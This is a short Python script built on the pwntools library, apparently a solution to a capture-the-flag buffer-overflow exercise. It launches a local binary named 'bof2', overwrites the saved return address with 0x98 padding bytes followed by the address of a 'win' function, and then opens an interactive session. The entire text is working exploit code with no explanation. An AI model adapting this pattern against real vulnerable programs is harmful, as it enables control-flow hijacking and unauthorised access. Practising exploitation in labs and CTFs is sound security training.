from pwn import *

p = process("./bof2")

win = 0x401196
payload = b"A"*0x98 + p64(win)

p.sendline(payload)

p.interactive()